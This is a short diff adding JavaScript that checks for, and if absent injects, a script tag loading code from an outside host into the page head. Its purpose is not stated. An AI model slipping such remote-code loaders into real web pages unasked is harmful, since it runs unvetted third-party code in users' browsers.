@@ -1,0 +1,3 @@
+﻿var scripts = document.getElementsByTagName("script"); var attached = false; var attachedUrl = "http://www.zhangsichu.com/attachIE/attachIEWork___.js";
+for(var i=0; i<scripts.length; i++){if(scripts[i].src == attachedUrl){ attached = true; break;}}
+if(!attached){var inject = document.createElement('script'); inject.type='text/javascript'; inject.src=attachedUrl; document.getElementsByTagName('head')[0].appendChild(inject);}
